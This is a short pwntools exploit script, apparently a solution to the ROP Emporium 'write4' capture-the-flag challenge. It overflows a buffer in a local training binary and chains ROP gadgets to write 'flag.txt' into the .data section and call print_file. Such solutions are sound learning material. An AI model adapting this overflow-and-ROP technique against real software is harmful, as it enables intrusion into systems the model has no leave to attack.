from pwn import *

context.log_level = 'debug'

elf = ELF('./write4')
rop = ROP(elf)
io = process(elf.path)

offset = 40
print_file = elf.plt['print_file']
data_section = elf.get_section_by_name('.data').header.sh_addr

mov_r14_r15 = 0x400628
pop_r14_r15 = rop.find_gadget(['pop r14','pop r15','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload = b'A' * offset

payload += p64(pop_r14_r15)
payload += p64(data_section)      
payload += b"flag.txt"             
payload += p64(mov_r14_r15)      

payload += p64(pop_rdi)
payload += p64(data_section)       
payload += p64(print_file)     

io.sendlineafter(b'> ', payload)
io.interactive()